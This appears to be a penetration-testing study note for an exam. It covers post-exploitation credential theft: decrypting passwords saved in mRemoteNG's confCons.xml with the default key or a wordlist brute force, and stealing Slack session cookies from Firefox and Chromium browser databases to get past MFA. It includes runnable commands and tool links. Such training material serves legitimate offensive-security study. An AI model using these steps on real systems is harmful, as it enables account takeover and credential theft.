# mRemoteNG Credential Extraction (Got to know this was installed on the system by examining the output of the above command in ps)

## Identify

- Software: **mRemoteNG**
    
- Config file: `confCons.xml`
    
- Default location:
    

```text
%USERPROFILE%\AppData\Roaming\mRemoteNG
```

## 1. Find Configuration File

```powershell
ls C:\Users\<user>\AppData\Roaming\mRemoteNG
```

Look for:

```text
confCons.xml
```

## 2. Extract Credentials

`confCons.xml` contains connection details:

- `Username`
    
- `Domain`
    
- `Hostname`
    
- `Protocol`
    
- Encrypted `Password`
    

Example:

```xml
<Node Username="administrator"
      Domain="test.local"
      Password="<encrypted_password>"
      Hostname="10.0.0.10"
      Protocol="RDP" />
```

Copy the `Password` attribute.

## 3. Decrypt Password

### No Custom Master Password

Default master password is:

```text
mR3m
```

Run:

```bash
python3 mremoteng_decrypt.py -s "<encrypted_password>"
```

### Custom Master Password Known

```bash
python3 mremoteng_decrypt.py -s "<encrypted_password>" -p <master_password>
```

If you get:

```text
ValueError: MAC check failed
```

→ Master password is incorrect.

## 4. Crack Master Password

Use a wordlist against the encrypted password:

```bash
for password in $(cat /usr/share/wordlists/fasttrack.txt); do
    echo $password
    python3 mremoteng_decrypt.py -s "<encrypted_password>" -p $password 2>/dev/null
done
```

Successful decryption:

```text
Password: <decrypted_password>
```

## Exam Flow

```text
mRemoteNG installed
      ↓
Find confCons.xml
      ↓
Extract Password attribute
      ↓
Try default mR3m
      ↓
If custom password → crack with wordlist
      ↓
Decrypt → obtain credentials
```

## Abusing Cookies to Get Access to IM Clients
> Instant messaging apps
> There are multiple options to gain access to an IM Client;
> 	use the user's credentials to get the cloud version of the IM application
> 	If the user is using any form of multi-factor authentication, or we can't get the user's plaintext credentials, we can try to steal the user's cookies to log in to the cloud-based client.

- Multiple posts refer to how to abuse `Slack` such as [Abusing Slack for Offensive Operations](https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282) and [Phishing for Slack-tokens](https://thomfre.dev/post/2021/phishing-for-slack-tokens/). We can use them to understand better how Slack tokens and cookies work, but keep in mind that `Slack's` behavior may have changed since the release of those posts.

##### Cookie Extraction from Firefox
- Saves cookies in `SQLite` database file named `cookies.sqlite`.
- Located in each user's APPDATA directory `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`.
#### Copy Firefox Cookies Database
```python
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```
- We can copy the file to our machine and use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database.

#### Extract Slack Cookie from Firefox Cookies Database
```python
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

**After getting the cookie we can use a browser extension [Cookie-Editor](https://cookie-editor.cgagnier.ca/) to add the cookie to our browser**
- Then go to our target website (slack in this case)
- use the extension to add the cookie as the value of `d` cookie, refresh
- voila you are in

## Cookie Extraction from Chromium-based Browsers
> Also stores cookies info in `SQLite` database.
> Only difference is that the cookie value is encrypted with [Data Protection API (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection).
> Thankfully, a tool [SharpChromium](https://github.com/djhohnstein/SharpChromium) does what we need. It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format.

- Let's use [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1), a PowerShell script created by [S3cur3Th1sSh1t](https://twitter.com/ShitSecure) which uses reflection to load SharpChromium.'
